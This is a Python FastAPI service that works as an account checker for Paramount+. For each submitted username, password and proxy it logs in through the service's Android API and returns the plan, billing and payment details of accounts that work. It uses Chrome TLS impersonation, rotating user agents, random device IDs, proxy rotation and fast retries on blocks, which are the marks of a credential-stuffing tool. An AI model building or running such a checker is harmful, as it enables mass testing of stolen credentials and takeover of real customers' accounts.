import asyncio
import secrets
import re
from typing import Optional
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from curl_cffi.requests import AsyncSession

app = FastAPI(title="Paramount+ Serverless Auth API Hyper-Fast")

# Pre-compiled regex patterns for raw performance
PROXY_USERPASS_RE = re.compile(r"^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$")
PROXY_IPPORT_RE = re.compile(r"^([^:]+:[^:]+)")
JSON_EXTRACT_RE = re.compile(r'"subscriptionCountry":"([^"]*)".*?"productName":"([^"]*)".*?"planType":"([^"]*)".*?"billingCadence":"([^"]*)".*?"packageCode":"([^"]*)".*?"packageSource":"([^"]*)"', re.DOTALL)

# Optimized static selection to eliminate fake-useragent library initialization lags
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
]

COUNTRY_MAP = {
    "AF": "Afganistan ", "AX": "Åland Islands ", "AL": "Albania ", "DZ": "Algeria ",
    "AS": "American Samoa ", "AD": "Andorra ", "AO": "Angola ", "AI": "Anguilla ",
    "AQ": "Antartica ", "AG": "Antigua and Barbuda ", "AR": "Argentina ", "AM": "Armenia ",
    "AW": "Aruba ", "AU": "Australia ", "AT": "Austria ", "AZ": "Azerbaijan ",
    "BS": "Bahamas ", "BH": "Bahrain ", "BD": "Bangladesh ", "BB": "Barbados ",
    "BY": "Belarus ", "BE": "Belgium ", "BZ": "Belize ", "BJ": "Benin ",
    "BM": "Bermuda ", "BT": "Bhutan ", "BO": "Bolivia ", "BQ": "Bonaire",
    "BA": "Bosnia and Herzegovina ", "BW": "Botswana ", "BR": "Brazil ",
    "IO": "British Indian Ocean Territory ", "VG": "British Virgin Islands ", "BN": "Brunei ",
    "BG": "Bulgaria ", "BF": "Burkina Faso ", "BI": "Burundi ", "KH": "Cambodia ",
    "CM": "Cameroon ", "CA": "Canada ", "IC": "Canary Islands ", "CV": "Cape Verde ",
    "KY": "Cayman Islands ", "CF": "Central African Republic ", "TD": "Chad ",
    "CL": "Chile  ", "CN": "China ", "CX": "Christmas Island ", "CC": "Cocos (Keeling) Islands ",
    "CO": "Colombia ", "KM": "Comoros ", "CG": "Republic Congo ", "CD": "Democratic Congo ",
    "CK": "Cook Islands ", "CR": "Costa Rica ", "CI": "CÃ´te d'Ivoire ", "HR": "Croatia ",
    "CU": "Cuba ", "CW": "CuraÃ§ao ", "CY": "Cyprus ", "CZ": "Czech Republic ",
    "DK": "Denmark ", "DJ": "Djibouti ", "DM": "Dominica ", "DO": "Dominican Republic ",
    "EC": "Ecuador ", "EG": "Egypt ", "SV": "El Salvador ", "GQ": "Equatorial Guinea ",
    "ER": "Eritrea ", "EE": "Estonia ", "ET": "Eswatini ", "FK": "Falkland Islands ",
    "FO": "Faroe Islands ", "FJ": "Fiji ", "FI": "Finland ", "FR": "France ",
    "GF": "French Guiana ", "PF": "French Polynesia ", "TF": "French Southern Territories ",
    "GA": "Gabon ", "GM": "Gambia ", "GE": "Georgia ", "DE": "Germany ",
    "GH": "Ghana ", "GI": "Gibraltar ", "GR": "Greece ", "GL": "Greenland ",
    "GD": "Grenada ", "GP": "Guadeloupe ", "GU": "Guam ", "GT": "Guatemala ",
    "GG": "Guernsey ", "GN": "Guinea ", "GW": "Guinea-Bissau ", "GY": "Guyana ",
    "HT": "Haiti ", "HN": "Honduras ", "HK": "Hong Kong ", "HU": "Hungary ",
    "IS": "Iceland ", "IN": "India ", "ID": "Indonesia ", "IR": "Iran ",
    "IQ": "Iraq ", "IE": "Ireland ", "IM": "Isle of Man ", "IL": "Israel ",
    "IT": "Italy ", "JM": "Jamaica ", "JP": "Japan ", "JE": "Jersey ",
    "JO": "Jordan ", "KZ": "Kazakhstan ", "KE": "Kenya ", "KI": "Kiribati ",
    "XK": "Kosovo ", "KW": "Kuwait ", "KG": "Kyrgyzstan ", "LA": "Laos ",
    "LV": "Latvia ", "LB": "Lebanon ", "LS": "Lesotho ", "LR": "Liberia ",
    "LY": "Libya ", "LI": "Liechtenstein ", "LT": "Lithuania ", "LU": "Luxembourg ",
    "MO": "Macau ", "MG": "Madagascar ", "MW": "Malawi ", "MY": "Malaysia ",
    "MV": "Maldives ", "ML": "Mali ", "MT": "Malta ", "MH": "Marshall Islands ",
    "MQ": "Martinique ", "MR": "Mauritania ", "MU": "Mauritius ", "YT": "Mayotte ",
    "MX": "Mexico ", "FM": "Micronesia ", "MD": "Moldova ", "MC": "Monaco ",
    "MN": "Mongolia ", "ME": "Montenegro ", "MS": "Montserrat ", "MA": "Morocco ",
    "MZ": "Mozambique ", "MM": "Myanmar ", "NA": "Namibia ", "NR": "Nauru ",
    "NP": "Nepal ", "NL": "Netherlands ", "NC": "New Caledonia ", "NZ": "New Zealand ",
    "NI": "Nicaragua ", "NE": "Niger ", "NG": "Nigeria ", "NU": "Niue ",
    "NF": "Norfolk Island ", "KP": "North Korea ", "MK": "North Macedonia ",
    "MP": "Northern Mariana Islands ", "NO": "Norway ", "OM": "Oman ", "PK": "Pakistan ",
    "PW": "Palau ", "PS": "Palestine ", "PA": "Panama ", "PG": "Papua New Guinea ",
    "PY": "Paraguay ", "PE": "Peru ", "PH": "Philippines ", "PN": "Pitcairn ",
    "PL": "Poland ", "PT": "Portugal ", "PR": "Puerto Rico ", "QA": "Qatar ",
    "RE": "Réunion ", "RO": "Romania ", "RU": "Russia ", "RW": "Rwanda ",
    "WS": "Samoa ", "SM": "San Marino ", "ST": "Sao Tome and Principe ", "SA": "Saudi Arabia ",
    "SN": "Senegal ", "RS": "Serbia ", "SC": "Seychelles ", "SL": "Sierra Leone ",
    "SG": "Singapore ", "SX": "Sint Maarten ", "SK": "Slovakia ", "SI": "Slovenia ",
    "GS": "South Georgia and the South Sandwich Islands ", "SB": "Solomon Islands ", "SO": "Somalia ",
    "ZA": "South Africa ", "KR": "South Korea ", "SS": "South Sudan ", "ES": "Spain ",
    "LK": "Sri Lanka ", "BL": "St. Barthélemy ", "SH": "Saint Helena, Ascension and Tristan da Cunha ",
    "KN": "Saint Kitts and Nevis ", "LC": "St. Lucia ", "PM": "Saint Pierre and Miquelon ",
    "VC": "Saint Vincent and the Grenadines ", "SD": "Sudan ", "SR": "Suriname ",
    "SZ": "Swaziland ", "SE": "Sweden ", "CH": "Switzerland ", "SY": "Syrian Arab Republic ",
    "TW": "Taiwan ", "TJ": "Tajikistan ", "TZ": "Tanzania ", "TH": "Thailand ",
    "TL": "Timor-Leste ", "TG": "Togo ", "TK": "Tokelau ", "TO": "Tonga ",
    "TT": "Trinidad and Tobago ", "TN": "Tunisia ", "TR": "Turkey ", "TM": "Turkmenistan ",
    "TC": "Turks and Caicos Islands ", "TV": "Tuvalu ", "UG": "Uganda ", "UA": "Ukraine ",
    "AE": "UAE ", "GB": "United Kingdom ", "US": "United States ", "UY": "Uruguay ",
    "UZ": "Uzbekistan ", "VI": "Virgin Islands ", "VU": "Vanuatu ", "VA": "Vatican ",
    "VE": "Venezuela ", "VN": "Vietnam ", "WF": "Wallis and Futuna ", "EH": "Western Sahara ",
    "YE": "Yemen ", "ZM": "Zambia ", "ZW": "Zimbabwe "
}

class AuthRequest(BaseModel):
    username: str
    password: str
    proxy: Optional[str] = None


def format_proxy(raw_proxy: str) -> Optional[dict]:
    if not raw_proxy:
        return None
    match_userpass = PROXY_USERPASS_RE.match(raw_proxy)
    match_ipport = PROXY_IPPORT_RE.match(raw_proxy)
    
    if match_userpass and match_ipport:
        proxy_str = f"http://{match_userpass.group(1)}@{match_ipport.group(1)}"
    elif not raw_proxy.startswith("http"):
        proxy_str = f"http://{raw_proxy}"
    else:
        proxy_str = raw_proxy
        
    return {"http": proxy_str, "https": proxy_str}


async def run_session_request_async(session: AsyncSession, url: str, method: str, data: Optional[dict] = None, headers: Optional[dict] = None, proxies: Optional[dict] = None) -> tuple[int, str]:
    retries = 0
    while retries < 3:  # Lowered retry max to keep serverless function from eating time
        try:
            if method == "POST":
                resp = await session.post(url, data=data, headers=headers, proxies=proxies, timeout=6)
            else:
                resp = await session.get(url, headers=headers, proxies=proxies, timeout=6)
                
            if resp.status_code in [500, 403, 406]:
                retries += 1
                await asyncio.sleep(0.1) # Aggressive fast fallback backoff
                continue
            return resp.status_code, resp.text
        except Exception:
            retries += 1
            await asyncio.sleep(0.1)
            continue
    return 0, ""


@app.post("/auth")
async def authenticate(payload: AuthRequest):
    proxies_dict = format_proxy(payload.proxy)
    device_id = secrets.token_hex(8)
    user_agent = secrets.choice(USER_AGENTS)

    base_headers = {
        "Host": "www.intl.paramountplus.com",
        "Cookie": "CBS_DEVICEID=",
        "Cache-Control": "max-age=0",
        "Traceparent": "00-c206720e0f5a4e1387706d69d577877c-10cc66f212114532-01",
        "User-Agent": user_agent,
        "Accept-Language": "en-US,en;q=0.9"
    }

    async with AsyncSession(impersonate="chrome120") as session:
        # Step 1: Login Check Execution
        login_url = "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
        login_headers = base_headers.copy()
        login_headers["Content-Type"] = "application/x-www-form-urlencoded"
        
        body_data = {
            "j_username": payload.username,
            "j_password": payload.password,
            "deviceId": device_id
        }

        status, source = await run_session_request_async(session, login_url, "POST", data=body_data, headers=login_headers, proxies=proxies_dict)

        if not source or "Invalid username/password pair" in source or '"status":400,"error":"Bad Request",' in source:
            raise HTTPException(status_code=401, detail="Failure: Invalid Credentials")
        if "userId" not in source:
            raise HTTPException(status_code=400, detail="Failure: Unknown Response Structure")

        # Step 2: Details Capture
        status_url = "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"

        status_code, status_source = await run_session_request_async(session, status_url, "GET", headers=base_headers, proxies=proxies_dict)

        if "NEW_FREE_PACKAGE" in status_source or '"planType":null,' in status_source:
            return {"status": "Custom/Free", "detail": "Account has no active premium package"}

        # Extract values in 1 step using optimized Regex match sequence instead of running Index strings 6 times
        match = JSON_EXTRACT_RE.search(status_source)
        if match:
            country_code, plan, plan_type, billing_period, package_code, payment_method = match.groups()
        else:
            # Fallback safe assignment if regex order layout shifts slightly
            return {"status": "Success", "detail": "Live Account, unable to parse capture properties."}

        return {
            "status": "Success",
            "capture": {
                "country": COUNTRY_MAP.get(country_code, f"Unknown ({country_code})"),
                "plan": plan,
                "plan_type": plan_type,
                "billing_period": billing_period,
                "package": package_code,
                "payment_method": payment_method
            }
        }
